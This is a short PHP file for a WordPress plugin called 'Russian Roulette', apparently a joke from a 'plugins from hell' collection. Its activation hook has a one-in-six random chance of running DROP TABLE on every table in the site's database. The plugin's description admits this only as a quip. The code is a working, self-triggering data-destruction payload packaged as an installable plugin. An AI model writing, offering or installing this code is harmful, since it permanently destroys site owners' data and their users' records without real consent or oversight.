<?php
/**
 * Plugin Name: Russian Roulette
 * Description: Feel alive with 1:6 chance of losing it all on activation.
 * Version: 1.0
 * Author: teemusuoranta/wordpress-plugins-from-hell
 * Author URI: https://github.com/teemusuoranta/wordpress-plugins-from-hell
 */

function russian_roulette_pull_the_trigger() {

  if (rand(1, 6) == 6) {

    global $wpdb;
    foreach ($wpdb->tables() as $table) {
      $wpdb->query("DROP TABLE $table");
    }

  }

}

register_activation_hook(__FILE__, 'russian_roulette_pull_the_trigger');
